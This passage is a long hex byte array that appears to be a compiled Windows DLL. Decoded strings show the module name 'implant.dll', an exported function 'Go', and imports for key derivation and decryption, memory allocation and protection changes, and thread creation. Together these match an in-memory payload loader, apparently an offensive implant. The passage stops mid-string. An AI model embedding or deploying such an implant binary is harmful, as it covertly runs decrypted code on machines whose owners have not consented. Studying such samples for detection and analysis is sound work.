0x1, 0xa, 0x4, 0x0, 0xa, 0x34, 0xa, 0x0, 0xa, 0x72, 0x6, 0x70, 0x19, 0x2d, 0xd, 0x35, 0x1f, 0x74, 0x14, 0x0, 0x1b, 0x64, 0x13, 0x0, 0x17, 0x34, 0x12, 0x0, 0x13, 0x33, 0xe, 0xb2, 0xa, 0xf0, 0x8, 0xe0, 0x6, 0xd0, 0x4, 0xc0, 0x2, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x50, 0x0, 0x0, 0x0, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0x11, 0x0, 0xf, 0x34, 0x10, 0x0, 0xf, 0xd2, 0xb, 0x70, 0x19, 0x2d, 0xd, 0x55, 0x1f, 0x74, 0x14, 0x0, 0x1b, 0x64, 0x13, 0x0, 0x17, 0x34, 0x12, 0x0, 0x13, 0x53, 0xe, 0xb2, 0xa, 0xf0, 0x8, 0xe0, 0x6, 0xd0, 0x4, 0xc0, 0x2, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x58, 0x0, 0x0, 0x0, 0x1, 0x14, 0x6, 0x0, 0x14, 0x64, 0x7, 0x0, 0x14, 0x34, 0x6, 0x0, 0x14, 0x32, 0x10, 0x70, 0x11, 0x15, 0x8, 0x0, 0x15, 0x74, 0xa, 0x0, 0x15, 0x64, 0x9, 0x0, 0x15, 0x34, 0x8, 0x0, 0x15, 0x52, 0x11, 0xf0, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xab, 0xb2, 0x0, 0x0, 0xf2, 0xb2, 0x0, 0x0, 0xe9, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x8, 0x1, 0x0, 0x8, 0x62, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xa1, 0xb4, 0x0, 0x0, 0xfb, 0xb4, 0x0, 0x0, 0xa4, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x14, 0x9, 0x0, 0x14, 0xc2, 0xd, 0xf0, 0xb, 0xe0, 0x9, 0xd0, 0x7, 0xc0, 0x5, 0x70, 0x4, 0x60, 0x3, 0x30, 0x2, 0x50, 0x0, 0x0, 0x11, 0x1c, 0xa, 0x0, 0x1c, 0xc4, 0xf, 0x0, 0x1c, 0x74, 0xe, 0x0, 0x1c, 0x34, 0xd, 0x0, 0x1c, 0x72, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x4c, 0xbe, 0x0, 0x0, 0x8b, 0xbe, 0x0, 0x0, 0xbe, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x19, 0x33, 0xb, 0x0, 0x25, 0x34, 0x24, 0x0, 0x19, 0x1, 0x1c, 0x0, 0xe, 0xf0, 0xc, 0xe0, 0xa, 0xd0, 0x8, 0xc0, 0x6, 0x70, 0x5, 0x60, 0x4, 0x50, 0x0, 0x0, 0xe0, 0xe2, 0x0, 0x0, 0xe8, 0x4c, 0x1, 0x0, 0xdb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7f, 0xb7, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x19, 0x2d, 0x9, 0x0, 0x1b, 0x54, 0x90, 0x2, 0x1b, 0x34, 0x8e, 0x2, 0x1b, 0x1, 0x8a, 0x2, 0xe, 0xe0, 0xc, 0x70, 0xb, 0x60, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x40, 0x14, 0x0, 0x0, 0x19, 0x31, 0xb, 0x0, 0x1f, 0x54, 0x96, 0x2, 0x1f, 0x34, 0x94, 0x2, 0x1f, 0x1, 0x8e, 0x2, 0x12, 0xf0, 0x10, 0xe0, 0xe, 0xc0, 0xc, 0x70, 0xb, 0x60, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x60, 0x14, 0x0, 0x0, 0x11, 0xa, 0x4, 0x0, 0xa, 0x34, 0x9, 0x0, 0xa, 0x52, 0x6, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x12, 0xc2, 0x0, 0x0, 0x90, 0xc2, 0x0, 0x0, 0xd5, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x17, 0xa, 0x0, 0x17, 0x54, 0xe, 0x0, 0x17, 0x34, 0xd, 0x0, 0x17, 0x52, 0x13, 0xf0, 0x11, 0xe0, 0xf, 0xd0, 0xd, 0xc0, 0xb, 0x70, 0x1, 0xe, 0x2, 0x0, 0xe, 0x32, 0xa, 0x30, 0x1, 0x18, 0x6, 0x0, 0x18, 0x54, 0x7, 0x0, 0x18, 0x34, 0x6, 0x0, 0x18, 0x32, 0x14, 0x60, 0x1, 0x9, 0x1, 0x0, 0x9, 0x42, 0x0, 0x0, 0x1, 0x10, 0x6, 0x0, 0x10, 0x64, 0x9, 0x0, 0x10, 0x34, 0x8, 0x0, 0x10, 0x52, 0xc, 0x70, 0x11, 0x10, 0x4, 0x0, 0x10, 0x34, 0x9, 0x0, 0x10, 0x52, 0xc, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xa4, 0xc9, 0x0, 0x0, 0xb1, 0xc9, 0x0, 0x0, 0xee, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0xa, 0x3, 0x0, 0xa, 0x68, 0x2, 0x0, 0x4, 0xa2, 0x0, 0x0, 0x19, 0x1e, 0x8, 0x0, 0xf, 0x72, 0xb, 0xf0, 0x9, 0xe0, 0x7, 0xc0, 0x5, 0x70, 0x4, 0x60, 0x3, 0x50, 0x2, 0x30, 0x1c, 0xdf, 0x0, 0x0, 0x30, 0x0, 0x0, 0x0, 0x1, 0x8, 0x1, 0x0, 0x8, 0xa2, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xd3, 0x0, 0x0, 0x37, 0xd4, 0x0, 0x0, 0xa4, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x0, 0x8, 0x92, 0x4, 0x30, 0x19, 0x26, 0x9, 0x0, 0x18, 0x68, 0xd, 0x0, 0x14, 0x1, 0x1c, 0x0, 0x9, 0xe0, 0x7, 0x70, 0x6, 0x60, 0x5, 0x30, 0x4, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0xc0, 0x0, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x12, 0x2, 0x30, 0x1, 0xb, 0x3, 0x0, 0xb, 0x68, 0x5, 0x0, 0x7, 0xc2, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x2, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x82, 0x0, 0x0, 0x1, 0x1b, 0x8, 0x0, 0x1b, 0x74, 0x9, 0x0, 0x1b, 0x64, 0x8, 0x0, 0x1b, 0x34, 0x7, 0x0, 0x1b, 0x32, 0x14, 0x50, 0x9, 0xf, 0x6, 0x0, 0xf, 0x64, 0x9, 0x0, 0xf, 0x34, 0x8, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xaa, 0xdd, 0x0, 0x0, 0xb1, 0xdd, 0x0, 0x0, 0x6, 0xe9, 0x0, 0x0, 0xb1, 0xdd, 0x0, 0x0, 0x9, 0xa, 0x4, 0x0, 0xa, 0x34, 0x6, 0x0, 0xa, 0x32, 0x6, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x7d, 0xde, 0x0, 0x0, 0xb0, 0xde, 0x0, 0x0, 0x40, 0xe9, 0x0, 0x0, 0xb0, 0xde, 0x0, 0x0, 0x1, 0x2, 0x1, 0x0, 0x2, 0x30, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x1, 0x0, 0x8, 0x42, 0x0, 0x0, 0x1, 0x9, 0x1, 0x0, 0x9, 0x62, 0x0, 0x0, 0x1, 0xa, 0x4, 0x0, 0xa, 0x34, 0xd, 0x0, 0xa, 0x72, 0x6, 0x70, 0x1, 0x8, 0x4, 0x0, 0x8, 0x72, 0x4, 0x70, 0x3, 0x60, 0x2, 0x30, 0x0, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x12, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x7b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xe8, 0x7b, 0x1, 0x0, 0x10, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x10, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x6c, 0x44, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x72, 0x7c, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x68, 0x7c, 0x1, 0x0, 0x6c, 0x7c, 0x1, 0x0, 0x70, 0x7c, 0x1, 0x0, 0x30, 0x11, 0x0, 0x0, 0x7e, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x69, 0x6d, 0x70, 0x6c, 0x61, 0x6e, 0x74, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x47, 0x6f, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x7c, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x80, 0x1, 0x0, 0x0, 0xf0, 0x0, 0x0, 0x8, 0x7d, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa6, 0x81, 0x1, 0x0, 0x48, 0xf0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbe, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xda, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfa, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x12, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x84, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xaa, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xce, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xde, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x26, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xae, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd6, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe2, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x32, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xba, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x34, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x41, 0x63, 0x71, 0x75, 0x69, 0x72, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x57, 0x0, 0x0, 0xdc, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x52, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0xc6, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x72, 0x69, 0x76, 0x65, 0x4b, 0x65, 0x79, 0x0, 0x0, 0xc8, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x73, 0x74, 0x72, 0x6f, 0x79, 0x4b, 0x65, 0x79, 0x0, 0xc5, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x0, 0x0, 0xc4, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x48, 0x61, 0x73, 0x68, 0x0, 0xd9, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x48, 0x61, 0x73, 0x68, 0x44, 0x61, 0x74, 0x61, 0x0, 0xc7, 0x0, 0x43, 0x72, 0x79, 0x70, 0x74, 0x44, 0x65, 0x73, 0x74, 0x72, 0x6f, 0x79, 0x48, 0x61, 0x73, 0x68, 0x0, 0x0, 0x41, 0x44, 0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x0, 0x2, 0x6, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x0, 0xfb, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x0, 0x0, 0xf1, 0x5, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xf7, 0x5, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74, 0x0, 0x0, 0x64, 0x4, 0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x6e, 0x63, 0x65, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x65, 0x72, 0x0, 0x2b, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x0, 0x2f, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x0, 0x0, 0x1, 0x3, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65, 0x41, 0x73, 0x46, 0x69, 0x6c, 0x65, 0x54, 0x69, 0x6d, 0x65, 0x0, 0x81, 0x3, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x53, 0x4c, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x0, 0xe9, 0x4, 0x52, 0x74, 0x6c, 0x43, 0x61, 0x70, 0x74, 0x75, 0x72, 0x65, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x0, 0xf1, 0x4, 0x52, 0x74, 0x6c, 0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x0, 0x0, 0xf8, 0x4, 0x52, 0x74, 0x6c, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x55, 0x6e, 0x77, 0x69, 0x6e, 0x64, 0x0, 0x0, 0x97, 0x3, 0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74, 0x0, 0xd8, 0x5, 0x55, 0x6e, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x46, 0x69, 0x6c, 0x74, 0x65, 0x72, 0x0, 0x0, 0x97, 0x5, 0x53, 0x65, 0x74, 0x55, 0x6e, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x46, 0x69, 0x6c, 0x74, 0x65, 0x72, 0x0, 0xe8, 0x2, 0x47, 0x65, 0x74, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x57, 0x0, 0x9e, 0x3, 0x49, 0x73, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x6f, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75, 0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6e, 0x74, 0x0, 0x8c, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x57, 0x0, 0x0, 0x4b, 0x45, 0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0, 0x0, 0xf7, 0x4, 0x52, 0x74, 0x6c, 0x55, 0x6e, 0x77, 0x69, 0x6e, 0x64, 0x45, 0x78, 0x0, 0x85, 0x3, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x6c, 0x6f, 0x63, 0x6b, 0x65, 0x64, 0x46, 0x6c, 0x75, 0x73, 0x68, 0x53, 0x4c, 0x69, 0x73, 0x74, 0x0, 0x74, 0x2, 0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x0, 0x0, 0x57, 0x5, 0x53, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x0, 0x0, 0x41, 0x1, 0x45, 0x6e, 0x74, 0x65, 0x72, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0xd6, 0x3, 0x4c, 0x65, 0x61, 0x76, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0x1b, 0x1, 0x44, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x7d, 0x3, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x43, 0x72, 0x69, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x41, 0x6e, 0x64, 0x53, 0x70, 0x69, 0x6e, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x0, 0xc8, 0x5, 0x54, 0x6c, 0x73, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x0, 0xca, 0x5, 0x54, 0x6c, 0x73, 0x47, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xcb, 0x5, 0x54, 0x6c, 0x73, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x0, 0xc9, 0x5, 0x54, 0x6c, 0x73, 0x46, 0x72, 0x65, 0x65, 0x0, 0xbd, 0x1, 0x46, 0x72, 0x65, 0x65, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x0, 0xc4, 0x2, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x0, 0x0, 0xdc, 0x3, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x45, 0x78, 0x57, 0x0, 0x0, 0x3d, 0x1, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x65, 0x50, 0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x0, 0x7b, 0x4, 0x52, 0x61, 0x69, 0x73, 0x65, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x0, 0x0, 0xf3, 0x4, 0x52, 0x74, 0x6c, 0x50, 0x63, 0x54, 0x6f, 0x46, 0x69, 0x6c, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x0, 0x2a, 0x2, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x70, 0x1, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0xb6, 0x5, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0, 0x0, 0x8b, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x45, 0x78, 0x57, 0x0, 0x0, 0x88, 0x2, 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x57, 0x0, 0x0, 0x63, 0x3, 0x48, 0x65, 0x61, 0x70, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0, 0x67, 0x3, 0x48, 0x65, 0x61, 0x70, 0x46, 0x72, 0x65, 0x65, 0x0, 0x0, 0x87, 0x1, 0x46, 0x69, 0x6e, 0x64, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x0, 0x8d, 0x1, 0x46, 0x69, 0x6e, 0x64, 0x46, 0x69, 0x72, 0x73, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x45, 0x78, 0x57, 0x0, 0x0, 0x9e, 0x1, 0x46, 0x69, 0x6e, 0x64, 